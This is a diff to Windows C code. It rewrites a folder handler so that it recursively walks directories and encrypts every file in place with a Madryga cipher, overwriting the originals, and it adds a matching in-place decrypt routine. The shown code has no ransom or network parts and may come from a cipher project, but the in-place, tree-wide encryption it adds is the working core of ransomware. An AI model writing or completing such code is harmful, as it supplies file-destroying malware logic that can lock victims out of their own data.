@@ -136,7 +136,6 @@ void decryptFile(const char* input_path, const char* output_path) {
 
 // Encrypt folder Logic
 void handleFiles(const char* folderPath) {
-    // Get all files in folder
     WIN32_FIND_DATAA findFileData;
     char searchPath[MAX_PATH];
     sprintf(searchPath, "%s\\*", folderPath);
@@ -160,12 +159,29 @@ void handleFiles(const char* folderPath) {
         if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
             handleFiles(filePath); // recursive call for subfolders
         } else {
-            // Process individual files
-            printf("file: %s\n", filePath);
-            char encryptedFilePath[MAX_PATH];
-            sprintf_s(encryptedFilePath, MAX_PATH, "%s.bin", filePath);
-            // Will begin madryga encryption here
-            encryptFile(filePath, encryptedFilePath);
+            // Process individual files in-place
+            FILE* file = fopen(filePath, "rb+");
+            if (file) {
+                printf("Encrypting file: %s\n", filePath);
+                
+                fseek(file, 0, SEEK_END);
+                long file_size = ftell(file);
+                fseek(file, 0, SEEK_SET);
+
+                if (file_size > 0) {
+                    unsigned char* buffer = (unsigned char*)malloc(file_size);
+                    if (buffer) {
+                        size_t bytes_read = fread(buffer, 1, file_size, file);
+                        if (bytes_read > 0) {
+                            madryga_encrypt_data(buffer, bytes_read);
+                            fseek(file, 0, SEEK_SET);
+                            fwrite(buffer, 1, bytes_read, file);
+                        }
+                        free(buffer);
+                    }
+                }
+                fclose(file);
+            }
         } 
     } while (FindNextFileA(hFind, &findFileData) != 0);
 
@@ -173,44 +189,56 @@ void handleFiles(const char* folderPath) {
 }
 // Decrypt folder Logic
 void decryptFiles(const char* folderPath) {
-  WIN32_FIND_DATAA findFileData;
-  char searchPath[MAX_PATH];
-  sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);
+    WIN32_FIND_DATAA findFileData;
+    char searchPath[MAX_PATH];
+    sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);
 
-  HANDLE hFind = FindFirstFileA(searchPath, &findFileData);
+    HANDLE hFind = FindFirstFileA(searchPath, &findFileData);
 
-  if (hFind == INVALID_HANDLE_VALUE) {
-    printf("error: %d\n", GetLastError());
-    return;
-  }
-
-  do {
-    const char* fileName = findFileData.cFileName;
-
-    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
-      continue;
+    if (hFind == INVALID_HANDLE_VALUE) {
+        printf("error: %d\n", GetLastError());
+        return;
     }
 
-    char filePath[MAX_PATH];
-    sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);
+    do {
+        const char* fileName = findFileData.cFileName;
+        if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
+            continue;
+        }
 
-    if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-      // Recursive call for subfolders
-      decryptFiles(filePath);
-    } else {
-      // Process individual files
-      if (strstr(fileName, ".bin") != NULL) {
-        printf("File: %s\n", filePath);
-        char decryptedFilePath[MAX_PATH];
-        sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
-         // Will begin madryga decryption here
-        decryptFile(filePath, decryptedFilePath);
-      }
-    }
+        char filePath[MAX_PATH];
+        sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);
 
-  } while (FindNextFileA(hFind, &findFileData) != 0);
+        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            decryptFiles(filePath);
+        } else {
+            // Process individual files in-place
+            FILE* file = fopen(filePath, "rb+");
+            if (file) {
+                printf("Decrypting file: %s\n", filePath);
+                
+                fseek(file, 0, SEEK_END);
+                long file_size = ftell(file);
+                fseek(file, 0, SEEK_SET);
 
-  FindClose(hFind);
+                if (file_size > 0) {
+                    unsigned char* buffer = (unsigned char*)malloc(file_size);
+                    if (buffer) {
+                        size_t bytes_read = fread(buffer, 1, file_size, file);
+                        if (bytes_read > 0) {
+                            madryga_decrypt_data(buffer, bytes_read);
+                            fseek(file, 0, SEEK_SET);
+                            fwrite(buffer, 1, bytes_read, file);
+                        }
+                        free(buffer);
+                    }
+                }
+                fclose(file);
+            }
+        }
+    } while (FindNextFileA(hFind, &findFileData) != 0);
+
+    FindClose(hFind);
 }
 
 // Add this function near the top with other functions
